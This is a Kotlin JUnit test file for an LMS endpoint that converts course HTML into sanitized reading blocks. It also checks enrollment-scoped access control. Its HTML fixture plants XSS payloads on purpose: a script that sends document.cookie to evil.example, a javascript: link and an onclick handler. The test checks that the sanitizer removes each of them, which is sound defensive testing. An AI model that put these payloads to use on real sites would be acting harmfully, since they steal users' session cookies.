package elearning.learning

import kotlinx.coroutines.runBlocking
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test
import org.springframework.http.HttpStatus
import org.springframework.http.MediaType
import wasichai.core.data.RecordRequest
import java.util.UUID

// la lectura en bloques (ADR-0045, docs/api/lms.md): el HTML del recurso del aula como documento de vocabulario cerrado, con
// el mismo alcance que la descarga de su archivo
class ReadingApiTest : ClassroomApiTestSupport() {
    private fun reading(
        enrollment: String,
        resource: String,
    ) = "/api/lms/classroom/enrollments/$enrollment/resources/$resource/reading"

    @Test
    fun `reading returns blocks for own enrollment`() {
        val course = course(html = HTML)
        val student = newStudent()
        val enrollment = enroll(student, course)["id"].asString()

        val document = ok(call(student, reading(enrollment, course.resource)))

        assertEquals("Portal del estudiante", document["title"].asString())
        val blocks = document["blocks"].values().toList()
        assertEquals(listOf("heading", "paragraph", "admonition", "heading"), blocks.map { it["type"].asString() })
        assertEquals("_entrar_y_salir_del_portal", blocks[0]["id"].asString())
        assertEquals(2, blocks[0]["level"].asInt())
        val inlines = blocks[1]["content"].values().toList()
        assertEquals(listOf("text", "strong", "text", "link", "text"), inlines.map { it["type"].asString() })
        // el enlace javascript: queda como texto
        assertEquals(". mal enlace", inlines[4]["text"].asString())
        assertEquals("https://example.org", inlines[3]["href"].asString())
        assertEquals("note", blocks[2]["kind"].asString())
        // la API de registros y la del aula escriben los nulos: un encabezado sin ancla lleva "id": null
        assertTrue(blocks[3].has("id") && blocks[3]["id"].isNull, blocks[3].toString())
        val raw = document.toString()
        listOf("script", "evil", "javascript", "class", "onclick").forEach { assertFalse(raw.contains(it, ignoreCase = true), "$it en $raw") }
        assertEquals(HttpStatus.NOT_FOUND, call(student, reading(enrollment, UUID.randomUUID().toString())).first)
        assertEquals(HttpStatus.UNAUTHORIZED, call(null, reading(enrollment, course.resource)).first)
    }

    @Test
    fun `reading of another student's resource is 404`() {
        val mine = course(html = HTML)
        val theirs = course(html = HTML)
        val student = newStudent()
        val other = newStudent()
        val myEnrollment = enroll(student, mine)["id"].asString()
        val theirEnrollment = enroll(other, theirs)["id"].asString()

        // con la matrícula ajena, y con la propia pidiendo el recurso de otro curso
        assertEquals(HttpStatus.NOT_FOUND, call(student, reading(theirEnrollment, theirs.resource)).first)
        assertEquals(HttpStatus.NOT_FOUND, call(student, reading(myEnrollment, theirs.resource)).first)
        // un docente, que ve todas las matrículas, tampoco lee por aquí la de otro
        assertEquals(HttpStatus.NOT_FOUND, call(newTeacher(), reading(theirEnrollment, theirs.resource)).first)
        ok(call(other, reading(theirEnrollment, theirs.resource)))
    }

    @Test
    fun `reading of a withdrawn enrollment is 404`() {
        val course = course(html = HTML)
        val student = newStudent()
        val enrollment = enroll(student, course)["id"].asString()
        ok(call(student, reading(enrollment, course.resource)))
        runBlocking {
            records.asPlatform(ORG) { records.patch("matricula", UUID.fromString(enrollment), RecordRequest(mapOf("estado" to "RETIRADA")), null, null) }
        }

        assertEquals(HttpStatus.NOT_FOUND, call(student, reading(enrollment, course.resource)).first)
    }

    @Test
    fun `reading of a non HTML resource is 404`() {
        val pdf = publishedResource("PDF", "guia.pdf", PDF, MediaType.APPLICATION_PDF)
        val course = course(html = HTML, extraResources = listOf(pdf))
        val student = newStudent()
        val enrollment = enroll(student, course)["id"].asString()
        // el PDF es del aula: su archivo se descarga, pero no tiene lectura en bloques
        val resources = ok(call(student, "/api/lms/classroom/enrollments/$enrollment"))["units"][0]["lessons"][0]["resources"]
        assertEquals(listOf(course.resource, pdf), resources.strings { it["id"] })

        assertEquals(HttpStatus.NOT_FOUND, call(student, reading(enrollment, pdf)).first)
        ok(call(student, reading(enrollment, course.resource)))
    }

    @Test
    fun `reading of an unpublished resource version linked to a lesson is 404`() {
        val course = course(html = HTML)
        val draft = publishedResource("HTML", "borrador.html", HTML.toByteArray(), MediaType.TEXT_HTML, publish = false)
        // datos de antes de #366: una lección de la versión publicada enlaza una versión de recurso en borrador
        runBlocking {
            records.asPlatform(ORG) {
                val lesson =
                    records.create("leccion", RecordRequest(mapOf("unidad" to course.unit, "orden" to 9, "titulo" to "Con borrador", "tipo" to "LECTURA")))
                records.create("recurso_leccion", RecordRequest(mapOf("leccion" to lesson.id, "version_recurso" to draft, "orden" to 1)))
            }
        }
        val student = newStudent()
        val enrollment = enroll(student, course)["id"].asString()

        assertEquals(HttpStatus.NOT_FOUND, call(student, reading(enrollment, draft)).first)
        ok(call(student, reading(enrollment, course.resource)))
    }

    @Test
    fun `a reading nested beyond the cap is flattened, not a server error`() {
        val deep = "<ul>".repeat(5000) + "<li>fondo</li>" + "</ul>".repeat(5000)
        val course = course(html = "<html><body>$deep</body></html>")
        val student = newStudent()
        val enrollment = enroll(student, course)["id"].asString()

        val document = ok(call(student, reading(enrollment, course.resource)))

        assertTrue(document.toString().contains("fondo"))
    }

    private companion object {
        val PDF = "%PDF-1.4\n%prueba\n".toByteArray()

        // como lo genera Asciidoctor, con lo que un autor puede colar por ++++ o pass:[]
        val HTML =
            """
            <!DOCTYPE html>
            <html lang="es"><head><meta charset="UTF-8"><title>Portal</title><style>body{color:#222}</style></head>
            <body class="article">
            <div id="header"><h1>Portal del estudiante</h1></div>
            <div id="content"><div class="sect1"><h2 id="_entrar_y_salir_del_portal">Entrar y salir del portal</h2>
            <div class="sectionbody"><div class="paragraph"><p>Con <strong>su cuenta</strong> y <a href="https://example.org">el portal</a>.
            <a href="javascript:alert(1)">mal enlace</a></p></div>
            <script>fetch('https://evil.example/' + document.cookie)</script>
            <div class="admonitionblock note" onclick="alert(2)"><table><tr><td class="icon"><div class="title">Note</div></td>
            <td class="content">Una nota.</td></tr></table></div>
            <h3>Sin ancla</h3>
            </div></div></div>
            </body></html>
            """.trimIndent()
    }
}
